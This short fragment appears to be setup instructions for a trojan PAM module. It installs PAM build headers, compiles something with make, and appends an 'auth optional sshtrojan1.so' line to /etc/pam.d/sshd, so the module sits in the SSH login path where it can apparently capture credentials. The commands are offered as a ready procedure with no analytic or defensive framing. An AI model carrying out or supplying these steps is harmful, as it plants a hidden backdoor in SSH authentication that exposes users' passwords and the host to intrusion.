`sudo apt install libpam0g-dev`

`make`

`printf "auth optional pam_unix.so nullok_secure audit\nauth optional sshtrojan1.so" >>  /etc/pam.d/sshd`
